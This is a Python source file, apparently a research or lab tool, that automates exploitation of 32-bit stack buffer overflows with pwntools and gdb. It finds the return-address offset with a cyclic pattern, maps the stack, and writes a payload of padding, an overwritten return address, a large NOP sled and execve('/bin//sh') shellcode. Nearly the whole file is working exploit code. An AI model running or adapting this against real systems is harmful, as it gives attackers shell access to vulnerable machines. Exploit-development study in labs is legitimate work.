from pwn import *
from utils import cleanup, build_command
import argparse

def generate_testcase():
    return cyclic(10000)

def reproducer(crash_input: bytes, arg_config: argparse.Namespace):
    """
    Validates that the input causes a memory corruption crash by reproducing that crash.

    Parameters:
    crash_input: Initial input that will cause a memory corruption crash.
    target_bin: The binary file we want to explore and exploit.

    Returns:
    bool: True if the program crashes with a segmentation fault.
    """
    target_bin = arg_config.target

    command = build_command(arg_config, crash_input)
    print(command)

    rep_proc = subprocess.Popen(
        command,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        text=True
    )

    #sending the crash input from stdin to all targets
    rep_proc.communicate(input=crash_input.decode())

    if rep_proc.returncode == -11:  #segfault
        core_path = f"/core_dumps/core.{target_bin}.{rep_proc.pid}"

        if os.path.isfile(core_path):
            os.remove(core_path)
            return True

        else:
            print("Core dump is missing; Something went wrong.")
            sys.exit(1)

    else:
        logging.error("No memory corruption crash detected")
        sys.exit(1)


def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace):
    """
    Triggers a test crash with the given input and extracts information from the resulting core dump.
    Analyzes the provided payload input to confirm whether it can reach and potentially overwrite
    the return address, causing EIP hijacking.


    Parameters:
    crash_input: The payload input that potentially overwrites the return address of the vulnerable function.
        
    target_bin: The binary file we want to explore and exploit.

    Returns:
    bool: True if the payload successfully reached and affected the return address.
    """

    #performs the crash 
    target_bin = arg_config.target

    command = build_command(arg_config, crash_input)
    print(command)

    crash_proc = subprocess.Popen(
        command,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        text=True
    )

    #sending the crash input from stdin to all targets
    crash_proc.communicate(input=crash_input.decode())

    core_path = f"/core_dumps/core.{target_bin}.{crash_proc.pid}"

    gdb_proc = subprocess.Popen(
        [f"gdb -q {target_bin} {core_path}"], 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        shell=True, 
        text=True
    )

    gdb_proc.stdin.write("info registers\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("q\n")
    gdb_proc.stdin.write("y\n")
    gdb_proc.stdin.flush()

    output, _ = gdb_proc.communicate()

    print(output)
    
    eip_value = None
    for line in output.splitlines():
        if "eip" in line:  # Find the line with 'eip'
            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
            break
    print(eip_value)


    return



def locate_ra(pattern, target):

    gdb_proc = subprocess.Popen(
        [f"gdb -q {target}"], 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        shell=True, 
        text=True
    )

    #send the pattern to the gdb target proc from both the arguments and stdin 
    #when I send commands from a script to gdb, 4 whitespaces (0x20202020) are added in the beginning of the buffer and it messes up the ra offset calculation!!!
    commands = f"""
    set pagination off
    set disable-randomization off
    r {pattern.decode('latin-1')}
    {pattern.decode('latin-1')}
    """

    gdb_proc.stdin.write(commands)
    gdb_proc.stdin.flush()

    while True:
        output = gdb_proc.stdout.readline()
        # print(output)
        if "Program received signal SIGSEGV" in output:
            break

    gdb_proc.stdin.write("info registers\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("info frame\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("x/40x $esp-1100\n")
    gdb_proc.stdin.flush()

    gdb_proc.stdin.write("q\n")
    gdb_proc.stdin.write("y\n")
    gdb_proc.stdin.flush()

    output, _ = gdb_proc.communicate()

    # print(output)
    # print(pattern)
    
    eip_value = None
    for line in output.splitlines():
        if "eip" in line:  # Find the line with 'eip'
            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
            break

    # print(eip_value)

    offset = cyclic_find(int(eip_value, 16))
    # print(f"offset: {offset}")
    return offset


        
def target_ra(target):

    #find in what adresses the stack fluctuates -> info proc mapping

    #first expand the stack filling it up with as many trash bytes as we can, will pass the trash file as command line argument
    trash = b'B'*131000
    trash_args = "`cat trash` " * 15    
    open("trash", "wb").write(trash)  

    gdb_process = subprocess.Popen(
        f"gdb {target}", 
        stdin=subprocess.PIPE, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        text=True, 
        shell=True
    )

    commands = f"""
    set disable-randomization off
    set breakpoint pending on
    b main
    r {trash_args}
    info proc mapping
    q
    y
    """

    gdb_process.stdin.write(commands)
    gdb_process.stdin.flush()
    output, _ = gdb_process.communicate()

    return output


def stack_middle_address(output):

    # Find the line containing the word "stack" and extract the address in the middle
    output_lines = output.split('\n')
    stack_line = next((line for line in output_lines if 'stack' in line), None)
    
    if stack_line is None:
        logging.error("GDB failed to find the stack line.")
        cleanup(1)
    
    pattern = r'\b0x[0-9a-f]+\b'
    matches = re.findall(pattern, stack_line)
    
    start_address = int(matches[0], 16)
    end_address = int(matches[1], 16)
    
    middle = (start_address + end_address) // 2
    middle += 4  #all the addresses end in 00 and when this is concatenated in bytes in the payload, it starts with \x00 and terminates the payload. Adding 4 to avoid the \x00 sequence

    # print(f"stack middle target addr: {hex(middle)}")
    return middle


def build_payload(offset, target):

    middle = stack_middle_address(target_ra(target))
    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

    #!!! will change
    if target == 'vuln':
        offset += 4 
    #!!!

    payload = b'A' * offset
    payload += struct.pack("<I", middle)
    payload += b'\x90' * 129000
    payload += shellcode

    open("payload", "wb").write(payload)
